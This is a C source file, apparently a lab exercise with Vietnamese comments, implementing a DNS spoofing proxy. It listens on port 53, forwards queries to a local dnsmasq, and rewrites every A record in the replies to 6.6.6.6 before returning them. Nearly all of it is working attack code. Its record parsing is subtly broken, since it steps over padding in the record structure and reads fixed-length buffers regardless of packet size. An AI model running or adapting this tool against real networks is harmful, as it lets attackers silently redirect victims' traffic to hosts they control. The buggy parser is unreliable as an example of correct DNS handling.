#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ctype.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>

#define DNS_SERVER "127.0.0.1"
#define DNS_PORT 5053
#define SPOOF_IP "6.6.6.6"

// DNS header structure
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// DNS question section structure
struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

// DNS resource record structure
struct dns_rr {
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
    unsigned char rdata[];
};

// Hàm kiểm tra xem packet có phải DNS response không
int is_dns_response(unsigned char *buffer) {
    struct dns_header *dns = (struct dns_header *)buffer;
    return (ntohs(dns->flags) & 0x8000); // Check QR bit (1 = response)
}

// Hàm in buffer dưới dạng hex
void print_buffer_in_hex(unsigned char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02x ", buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

int main() {
    int sockfd;
    struct sockaddr_in servaddr, cliaddr;
    char buffer[1024];
    socklen_t len = sizeof(cliaddr);

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(53);

    if (bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    while(1) {
        // Receive DNS query from client
        int n = recvfrom(sockfd, buffer, 1024, 0, 
                       (struct sockaddr*)&cliaddr, &len);

        // Forward to DNSMASQ
        struct sockaddr_in dns_addr;
        memset(&dns_addr, 0, sizeof(dns_addr));
        dns_addr.sin_family = AF_INET;
        dns_addr.sin_port = htons(DNS_PORT);
        inet_pton(AF_INET, DNS_SERVER, &dns_addr.sin_addr);

        int forward_sock = socket(AF_INET, SOCK_DGRAM, 0);
        sendto(forward_sock, buffer, n, 0, 
              (struct sockaddr*)&dns_addr, sizeof(dns_addr));

        // Get DNS response
        char response[1024];
        socklen_t dns_len = sizeof(dns_addr);
        int m = recvfrom(forward_sock, response, 1024, 0, 
                        (struct sockaddr*)&dns_addr, &dns_len);
        close(forward_sock);
        
        unsigned char *dns_payload = (unsigned char *)(response);
        if (is_dns_response(dns_payload)){
            printf("DNS Response Detected, original:\n");
            print_buffer_in_hex(dns_payload, 96);

            // --- Bắt đầu phần DNS Spoofing ---
            struct dns_header *dns = (struct dns_header *)dns_payload;
            unsigned char *reader = dns_payload + sizeof(struct dns_header);
            
            // Bỏ qua phần Question
            int qdcount = ntohs(dns->qdcount);
            for (int i = 0; i < qdcount; i++) {
                // Bỏ qua QNAME (chuỗi tên miền dạng length-value)
                while (*reader != 0) reader++;
                reader++; // Bỏ qua byte 0 kết thúc
                reader += 4; // Bỏ qua QTYPE và QCLASS
            }

            // Xử lý phần Answer
            int ancount = ntohs(dns->ancount);
            for (int i = 0; i < ancount; i++) {
                // Bỏ qua Name (có thể là con trỏ nén)
                if ((*reader & 0xC0) == 0xC0) {
                    reader += 2; // Bỏ qua con trỏ 2 byte
                } else {
                    while (*reader != 0) reader++;
                    reader++; // Bỏ qua byte 0
                }

                struct dns_rr *rr = (struct dns_rr *)reader;
                reader += sizeof(struct dns_rr); // Sửa lỗi ở đây

                // Nếu là bản ghi A (IPv4 address)
                if (ntohs(rr->type) == 1 && ntohs(rr->rdlength) == 4) {
                    printf("Original IP: %d.%d.%d.%d\n", 
                           rr->rdata[0], rr->rdata[1], rr->rdata[2], rr->rdata[3]);
                    
                    // Thay bằng SPOOF_IP
                    struct in_addr spoof_addr;
                    inet_pton(AF_INET, SPOOF_IP, &spoof_addr);
                    memcpy(rr->rdata, &spoof_addr.s_addr, 4);
                    
                    printf("Spoofed to IP: %s\n", SPOOF_IP);
                }
                reader += ntohs(rr->rdlength);
            }

            printf("Modified response:\n");
            print_buffer_in_hex(dns_payload, 96);
            // --- Kết thúc phần DNS Spoofing ---
        }    

        // Send modified response back to client
        sendto(sockfd, response, m, 0, 
              (struct sockaddr*)&cliaddr, len);
    }

    close(sockfd);
    return 0;
}